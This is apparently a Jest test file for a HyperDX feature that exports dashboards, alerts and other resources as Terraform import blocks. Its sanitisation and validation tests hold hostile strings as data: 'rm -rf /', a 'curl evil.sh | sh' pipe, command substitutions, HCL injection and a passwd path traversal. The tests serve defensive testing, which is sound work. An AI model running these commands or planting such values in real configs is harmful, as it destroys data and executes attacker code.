import {
  buildImportBlock,
  buildImportFile,
  collectImportableResources,
  dashboardHasUnexportableTiles,
  IAC_MANIFEST_LIMIT,
  type IacImportManifest,
  type IacResourceType,
  isImportableAlert,
  isImportableDashboard,
  isImportableSource,
  isUnexportableTile,
  providerEndpoint,
  TERRAFORM_RESOURCE_TYPES,
  terraformResourceLabel,
} from '@/iac';
import { DisplayType, SourceKind } from '@/types';

const ID = '655b1b7d9143aa1b1b73f4f4';
// Import ids are team-scoped: `<team_id>/<resource_id>`.
const TEAM_ID = '7a1c0de5b2f34c9d8e0a1b2c';

function emptyManifest(
  overrides: Partial<IacImportManifest> = {},
): IacImportManifest {
  return {
    dashboards: [],
    alerts: [],
    savedSearches: [],
    sources: [],
    connections: [],
    webhooks: [],
    truncatedTypes: [],
    ...overrides,
  };
}

describe('terraformResourceLabel', () => {
  // Ids, not names: a name-derived address changes on rename, and Terraform
  // reads the new address as a destroy of the object it already tracks.
  it('derives the label from the type and id, ignoring the name', () => {
    expect(
      terraformResourceLabel({
        type: 'dashboard',
        id: ID,
        name: 'HyperDX Usage!',
      }),
    ).toBe(`dashboard_${ID}`);
  });

  it('is unchanged by a rename', () => {
    expect(
      terraformResourceLabel({ type: 'alert', id: ID, name: 'Before' }),
    ).toBe(terraformResourceLabel({ type: 'alert', id: ID, name: 'After' }));
  });

  // ObjectIds can start with a digit, which Terraform rejects as an
  // identifier; the type prefix is what makes the label legal.
  it('produces a valid Terraform identifier for a digit-leading id', () => {
    expect(
      terraformResourceLabel({ type: 'source', id: '4'.repeat(24) }),
    ).toMatch(/^[a-z][a-z0-9_]*$/);
  });
});

// The alerts page and the bulk export both gate on this, so it is the single
// definition of "can the provider model this alert".
describe('isImportableAlert', () => {
  it('accepts a saved-search alert', () => {
    expect(
      isImportableAlert({ source: 'saved_search', savedSearchId: ID }),
    ).toBe(true);
  });

  it('rejects a tile alert', () => {
    expect(isImportableAlert({ source: 'tile' })).toBe(false);
  });

  it('rejects an alert with no source and no saved search', () => {
    expect(isImportableAlert({})).toBe(false);
  });

  // Reachable, not hypothetical: converting a saved-search alert to a tile
  // alert leaves the old savedSearch behind, because `makeAlert` passes
  // `savedSearch: undefined` and Mongoose 6 strips undefined from the `$set`.
  // An unconditional `||` fallback would wrongly offer this for import.
  it('rejects a tile alert carrying a stale savedSearchId', () => {
    expect(isImportableAlert({ source: 'tile', savedSearchId: ID })).toBe(
      false,
    );
  });

  // Legacy rows predate the `source` discriminator; a saved-search reference
  // is enough to identify them.
  it('accepts a legacy alert that only carries a savedSearchId', () => {
    expect(isImportableAlert({ savedSearchId: ID })).toBe(true);
  });
});

// The dashboard page and the server-side manifest filter both rest on this,
// so it is the single definition of "can Terraform own this dashboard".
describe('isImportableDashboard', () => {
  it('accepts a user-created dashboard', () => {
    expect(isImportableDashboard({})).toBe(true);
    expect(isImportableDashboard({ provisioned: false })).toBe(true);
  });

  // ProvisionDashboardsTask rewrites these wholesale on every run, so
  // Terraform managing one too would produce a permanent diff.
  it('rejects a provisioned dashboard', () => {
    expect(isImportableDashboard({ provisioned: true })).toBe(false);
  });
});

// The import flow reads dashboards back through the external v2 API, which
// drops PromQL tiles from the response, and then writes `tiles` wholesale — so
// applying a generated config deletes them. These dashboards must never be
// offered.
describe('dashboard tile exportability', () => {
  const promqlTile = {
    config: {
      configType: 'promql' as const,
      promqlExpression: 'up',
      connection: '6'.repeat(24),
      displayType: DisplayType.Line,
    },
  };
  const builderTile = {
    config: {
      displayType: DisplayType.Line,
      source: '7'.repeat(24),
      select: [{ aggFn: 'count' as const, valueExpression: '' }],
      where: '',
    },
  };

  it('flags a PromQL tile', () => {
    expect(isUnexportableTile(promqlTile)).toBe(true);
  });

  it('does not flag an ordinary builder tile', () => {
    expect(isUnexportableTile(builderTile)).toBe(false);
  });

  // The converter substitutes defaultTileConfig — an empty Line chart — for
  // anything it cannot represent, not just PromQL, and the write path then
  // persists that substitution. These are the other branches it rejects.
  it('flags a tile with no displayType', () => {
    expect(isUnexportableTile({ config: { source: '7'.repeat(24) } })).toBe(
      true,
    );
  });

  it.each([
    DisplayType.Search,
    DisplayType.Markdown,
    DisplayType.Heatmap,
    DisplayType.EventPatterns,
  ])('flags a raw-SQL tile displayed as %s', displayType => {
    expect(
      isUnexportableTile({
        config: {
          configType: 'sql',
          displayType,
          connection: '6'.repeat(24),
          sqlTemplate: 'SELECT 1',
        },
      }),
    ).toBe(true);
  });

  it.each([
    DisplayType.Line,
    DisplayType.StackedBar,
    DisplayType.Table,
    DisplayType.Number,
    DisplayType.Pie,
    DisplayType.Bar,
  ])('does not flag a raw-SQL tile displayed as %s', displayType => {
    expect(
      isUnexportableTile({
        config: {
          configType: 'sql',
          displayType,
          connection: '6'.repeat(24),
          sqlTemplate: 'SELECT 1',
        },
      }),
    ).toBe(false);
  });

  // A builder tile of these kinds IS representable — only the raw-SQL branch
  // of the converter rejects them.
  it('does not flag a builder markdown tile', () => {
    expect(
      isUnexportableTile({
        config: { displayType: DisplayType.Markdown, markdown: 'hi' },
      }),
    ).toBe(false);
  });

  // Dashboard.tiles is a Mongoose Mixed array, so the database enforces
  // nothing. One legacy row must not take down the whole team's manifest.
  it('survives a malformed tile instead of throwing', () => {
    expect(() =>
      dashboardHasUnexportableTiles([
        { config: undefined },
        { config: null },
        { config: 'nonsense' },
        {},
      ]),
    ).not.toThrow();
    expect(
      dashboardHasUnexportableTiles(
        'not-an-array' as unknown as readonly { config?: unknown }[],
      ),
    ).toBe(false);
  });

  it('flags a dashboard as soon as one tile is unexportable', () => {
    expect(dashboardHasUnexportableTiles([builderTile, promqlTile])).toBe(true);
    expect(dashboardHasUnexportableTiles([builderTile])).toBe(false);
    expect(dashboardHasUnexportableTiles([])).toBe(false);
    expect(dashboardHasUnexportableTiles(undefined)).toBe(false);
  });

  it('withholds a dashboard carrying unexportable tiles', () => {
    expect(isImportableDashboard({ unexportableTiles: true })).toBe(false);
    expect(isImportableDashboard({ unexportableTiles: false })).toBe(true);
  });

  // The reason a dashboard is ineligible does not change the outcome.
  it('withholds a provisioned dashboard regardless of tiles', () => {
    expect(
      isImportableDashboard({ provisioned: true, unexportableTiles: false }),
    ).toBe(false);
  });
});

// A PromQL source has no clickhouse_clickstack_source representation, so an
// import block for one fails the plan.
describe('isImportableSource', () => {
  it('accepts the ClickHouse-backed kinds', () => {
    for (const kind of [
      SourceKind.Log,
      SourceKind.Trace,
      SourceKind.Session,
      SourceKind.Metric,
    ]) {
      expect(isImportableSource({ kind })).toBe(true);
    }
  });

  it('rejects a PromQL source', () => {
    expect(isImportableSource({ kind: SourceKind.Promql })).toBe(false);
  });

  // An older manifest, or a row predating the discriminator, has no kind.
  it('accepts a source with no kind recorded', () => {
    expect(isImportableSource({})).toBe(true);
  });
});

// Both surfaces emit this, and they had drifted: the popover omitted the
// deployment path prefix the bulk export included.
describe('providerEndpoint', () => {
  it('appends /api to the origin', () => {
    expect(providerEndpoint('https://hdx.example.com')).toBe(
      'https://hdx.example.com/api',
    );
  });

  it('keeps a deployment path prefix', () => {
    expect(providerEndpoint('https://host.example.com', '/hyperdx')).toBe(
      'https://host.example.com/hyperdx/api',
    );
  });
});

describe('buildImportBlock', () => {
  // The block form, not the CLI `terraform import` one-liner: the CLI form
  // refuses to run unless the address is already declared in configuration,
  // and this feature generates none.
  // `<team_id>/<resource_id>`: on ClickHouse Cloud one service backs several
  // teams, so a bare resource id is ambiguous. Accepted since provider 3.22.0.
  it('emits an import block with the team-scoped id form', () => {
    expect(
      buildImportBlock(
        { type: 'dashboard', id: ID, name: 'HyperDX Usage' },
        TEAM_ID,
      ),
    ).toBe(
      `# HyperDX Usage\nimport {\n  to = clickhouse_clickstack_dashboard.dashboard_${ID}\n  id = "${TEAM_ID}/${ID}"\n}`,
    );
  });

  it('omits the comment line when the resource has no name', () => {
    expect(buildImportBlock({ type: 'alert', id: ID }, TEAM_ID)).toBe(
      `import {\n  to = clickhouse_clickstack_alert.alert_${ID}\n  id = "${TEAM_ID}/${ID}"\n}`,
    );
  });

  // Every provider resource name is asserted, not just the two most-used
  // types: a typo in any of them produces an address Terraform cannot resolve.
  it.each(Object.keys(TERRAFORM_RESOURCE_TYPES) as IacResourceType[])(
    'maps %s to its provider resource name',
    type => {
      expect(buildImportBlock({ type, id: ID }, TEAM_ID)).toContain(
        `to = ${TERRAFORM_RESOURCE_TYPES[type]}.${type}_${ID}`,
      );
    },
  );

  it('uses the documented clickhouse_clickstack_* resource names', () => {
    expect(TERRAFORM_RESOURCE_TYPES).toEqual({
      dashboard: 'clickhouse_clickstack_dashboard',
      alert: 'clickhouse_clickstack_alert',
      saved_search: 'clickhouse_clickstack_saved_search',
      source: 'clickhouse_clickstack_source',
      connection: 'clickhouse_clickstack_connection',
      webhook: 'clickhouse_clickstack_webhook',
    });
  });
});

// Names are user-controlled and now land in an HCL comment. A newline would
// end the comment and let the remainder of the name become a directive.
describe('name sanitisation', () => {
  it.each([
    'x\nrm -rf /; echo',
    'a"; curl evil.sh | sh; #',
    'evil\r\nresource "null_resource" "x" {}',
    '$(whoami)',
    '`id`',
    'tab\tseparated',
  ])('keeps a hostile name on one comment line: %s', hostile => {
    const block = buildImportBlock(
      { type: 'alert', id: ID, name: hostile },
      TEAM_ID,
    );
    const [comment, ...rest] = block.split('\n');

    expect(comment.startsWith('# ')).toBe(true);
    // Everything after the comment is the untouched import block.
    expect(rest.join('\n')).toBe(
      `import {\n  to = clickhouse_clickstack_alert.alert_${ID}\n  id = "${TEAM_ID}/${ID}"\n}`,
    );
  });

  it('drops a name that is only whitespace', () => {
    expect(
      buildImportBlock({ type: 'alert', id: ID, name: ' \n\t ' }, TEAM_ID),
    ).not.toContain('#');
  });
});

// `id` is the only manifest value reaching executable HCL, inside a quoted
// string where a `"` would close the literal. The label is filtered and the
// name is confined to a comment, so this is the remaining sink.
describe('resource id validation', () => {
  it.each([
    'a"; provider "null" {} #',
    '../../etc/passwd',
    '655b1b7d9143aa1b1b73f4f',
    '655b1b7d9143aa1b1b73f4f4x',
    'ZZZb1b7d9143aa1b1b73f4f4',
    '',
  ])('refuses to emit an import block for id %p', badId => {
    expect(() =>
      buildImportBlock({ type: 'alert', id: badId }, TEAM_ID),
    ).toThrow(/non-ObjectId resource id/);
  });

  // The team id is now the other half of the same sink.
  it('refuses to emit an import block for a bad team id', () => {
    expect(
      () =>
        buildImportBlock({ type: 'alert', id: ID }, 'a"; provider "null" {} #'),
      // Labelled, so the thrown error says which half of the id was wrong.
    ).toThrow(/non-ObjectId team id/);
  });

  it('refuses to emit a connection local for a bad id', () => {
    expect(() =>
      buildImportFile({
        endpoint: 'https://hyperdx.example.com/api',
        teamId: TEAM_ID,
        resources: [],
        connectionLocals: [{ id: 'not-an-objectid', name: 'Sneaky' }],
      }),
    ).toThrow(/non-ObjectId id/);
  });

  it('accepts ObjectId hex in either case', () => {
    expect(() =>
      buildImportBlock({ type: 'alert', id: ID.toUpperCase() }, TEAM_ID),
    ).not.toThrow();
  });
});

describe('buildImportFile', () => {
  it('contains the provider block, import blocks, and generate-config instructions', () => {
    const otherId = 'a55b1b7d9143aa1b1b73f4f4';
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [
        { type: 'dashboard', id: ID, name: 'Usage' },
        { type: 'saved_search', id: otherId, name: 'Errors' },
      ],
    });
    expect(file).toContain('source  = "ClickHouse/clickhouse"');
    expect(file).toContain('version = ">= 3.25.0"');
    // `import {}` and -generate-config-out both need Terraform 1.5+; without
    // the constraint an older CLI fails with a syntax error instead.
    expect(file).toContain('required_version = ">= 1.5.0"');
    // The endpoint is a variable, not a baked literal: its default comes from
    // the browser that generated the file, which may not resolve from wherever
    // Terraform runs.
    expect(file).toContain('variable "clickstack_endpoint"');
    expect(file).toContain('default     = "https://hyperdx.example.com/api"');
    expect(file).toContain('clickstack_endpoint = var.clickstack_endpoint');
    expect(file).toContain('CLICKSTACK_API_KEY');
    expect(file).toContain(
      `to = clickhouse_clickstack_dashboard.dashboard_${ID}`,
    );
    expect(file).toContain(`id = "${TEAM_ID}/${ID}"`);
    expect(file).toContain(
      `to = clickhouse_clickstack_saved_search.saved_search_${otherId}`,
    );
    expect(file).toContain('terraform plan -generate-config-out=generated.tf');
    expect(file).not.toContain('locals'); // no connections selected
  });

  // Two same-type resources sharing a name used to collide, because the
  // address was a name slug plus five hex characters of the id. Terraform
  // rejects the whole file when two import blocks share a `to` address.
  it('emits a unique address per resource when names and id suffixes collide', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [
        { type: 'alert', id: `${'a'.repeat(19)}11111`, name: 'Alert' },
        { type: 'alert', id: `${'b'.repeat(19)}11111`, name: 'Alert' },
      ],
    });
    const addresses = [...file.matchAll(/^ {2}to = (.+)$/gm)].map(m => m[1]);

    expect(addresses).toHaveLength(2);
    expect(new Set(addresses).size).toBe(2);
  });

  // A second export re-emits everything, so two of these files in one module
  // collide on duplicate `to` addresses and Terraform rejects the whole plan.
  it('warns that re-exporting is not additive', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [{ type: 'dashboard', id: ID, name: 'Usage' }],
    });

    expect(file).toContain('does NOT produce an additive file');
    expect(file).toContain('duplicate "to" addresses');
  });

  // The .tf is what gets committed and read later, so a partial export has to
  // say so in the file itself, not only in the UI that generated it.
  it('marks the file partial when a listing was capped', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [{ type: 'dashboard', id: ID, name: 'Usage' }],
      truncatedTypes: ['dashboards', 'alerts'],
    });

    expect(file).toContain('PARTIAL EXPORT');
    expect(file).toContain('dashboards, alerts');
    expect(file).toContain(String(IAC_MANIFEST_LIMIT));
  });

  it('omits the partial-export marker when nothing was capped', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [{ type: 'dashboard', id: ID, name: 'Usage' }],
    });

    expect(file).not.toContain('PARTIAL EXPORT');
  });

  // The team prefix has two consequences a user only discovers at apply time:
  // the `team` attribute it writes forces replacement if dropped, and a
  // provider configured against the Cloud API rejects team scoping outright.
  it('warns about the team attribute and the Cloud-configured provider', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [{ type: 'dashboard', id: ID, name: 'Usage' }],
    });

    expect(file).toContain('RequiresReplace');
    expect(file).toContain('clickstack_service_id');
  });

  it('explains that addresses survive a rename, and warns about whole-body writes', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [{ type: 'dashboard', id: ID, name: 'Usage' }],
    });
    expect(file).toContain('survive a rename');
    expect(file).toContain('written back whole');
    expect(file).toContain('delete the');
  });

  it('emits connections of unknown provenance as a locals block', () => {
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources: [],
      connectionLocals: [{ id: ID, name: 'Local ClickHouse' }],
    });
    expect(file).toContain('locals {');
    expect(file).toContain('# Local ClickHouse');
    // Bare id, not the team-scoped import form: a local is a value other
    // resources reference, not an address Terraform imports through.
    expect(file).toContain(`connection_${ID}_id = "${ID}"`);
    expect(file).not.toContain('clickhouse_clickstack_connection');
  });

  // The only branch that emits a connection import block. Previously asserted
  // on the intermediate array but never on the generated file.
  it('emits a self-managed connection as an import block, not a local', () => {
    const { resources, connectionLocals } = collectImportableResources(
      emptyManifest({
        connections: [
          { id: ID, name: 'Self hosted', platformProvisioned: false },
        ],
      }),
      ['connection'],
    );
    const file = buildImportFile({
      endpoint: 'https://hyperdx.example.com/api',
      teamId: TEAM_ID,
      resources,
      connectionLocals,
    });

    expect(file).toContain(
      `to = clickhouse_clickstack_connection.connection_${ID}`,
    );
    expect(file).not.toContain('locals {');
  });
});

describe('collectImportableResources', () => {
  const manifest = emptyManifest({
    dashboards: [{ id: '1'.repeat(24), name: 'D1' }],
    alerts: [
      {
        id: '2'.repeat(24),
        name: 'A1',
        source: 'saved_search',
        savedSearchId: '4'.repeat(24),
      },
      { id: '3'.repeat(24), name: 'A2 (tile)', source: 'tile' },
    ],
    savedSearches: [{ id: '4'.repeat(24), name: 'S1' }],
  });

  it('only includes selected types and skips tile alerts with a count', () => {
    const { resources, connectionLocals, skippedAlerts } =
      collectImportableResources(manifest, ['dashboard', 'alert']);
    expect(resources).toEqual([
      { type: 'alert', id: '2'.repeat(24), name: 'A1' },
      { type: 'dashboard', id: '1'.repeat(24), name: 'D1' },
    ]);
    expect(connectionLocals).toEqual([]);
    expect(skippedAlerts).toBe(1);
  });

  const withConnections = emptyManifest({
    ...manifest,
    connections: [{ id: '6'.repeat(24), name: 'Local ClickHouse' }],
  });

  // Provenance is tri-state; only an explicit `false` licenses an import.
  it('treats a connection of unknown provenance as reference-only', () => {
    const { resources, connectionLocals } = collectImportableResources(
      withConnections,
      ['connection'],
    );
    expect(resources).toEqual([]);
    expect(connectionLocals).toEqual([
      { id: '6'.repeat(24), name: 'Local ClickHouse' },
    ]);
  });

  it('keeps a platform-provisioned connection reference-only', () => {
    const { resources, connectionLocals } = collectImportableResources(
      emptyManifest({
        ...manifest,
        connections: [
          {
            id: '6'.repeat(24),
            name: 'Cloud ClickHouse',
            platformProvisioned: true,
          },
        ],
      }),
      ['connection'],
    );
    expect(resources).toEqual([]);
    expect(connectionLocals).toHaveLength(1);
  });

  it('imports a connection the server marks self-managed', () => {
    const { resources, connectionLocals } = collectImportableResources(
      emptyManifest({
        ...manifest,
        connections: [
          {
            id: '6'.repeat(24),
            name: 'Local ClickHouse',
            platformProvisioned: false,
          },
        ],
      }),
      ['connection'],
    );
    expect(resources).toEqual([
      { type: 'connection', id: '6'.repeat(24), name: 'Local ClickHouse' },
    ]);
    expect(connectionLocals).toEqual([]);
  });

  // The P1 this guards: a dashboard with a PromQL tile used to be emitted, and
  // applying the generated config would delete that tile.
  it('skips a dashboard with unexportable tiles and counts it', () => {
    const { resources, skippedDashboards } = collectImportableResources(
      emptyManifest({
        dashboards: [
          { id: '1'.repeat(24), name: 'Fine' },
          { id: '2'.repeat(24), name: 'Has PromQL', unexportableTiles: true },
        ],
      }),
      ['dashboard'],
    );

    expect(resources).toEqual([
      { type: 'dashboard', id: '1'.repeat(24), name: 'Fine' },
    ]);
    expect(skippedDashboards).toBe(1);
  });

  it('skips a PromQL source and counts it', () => {
    const { resources, skippedSources } = collectImportableResources(
      emptyManifest({
        sources: [
          { id: '3'.repeat(24), name: 'Logs', kind: SourceKind.Log },
          { id: '4'.repeat(24), name: 'Prom', kind: SourceKind.Promql },
        ],
      }),
      ['source'],
    );

    expect(resources).toEqual([
      { type: 'source', id: '3'.repeat(24), name: 'Logs' },
    ]);
    expect(skippedSources).toBe(1);
  });

  it('emits neither when connections are not selected', () => {
    const { resources, connectionLocals } = collectImportableResources(
      withConnections,
      ['dashboard'],
    );
    expect(resources.some(r => r.type === 'connection')).toBe(false);
    expect(connectionLocals).toEqual([]);
  });
});
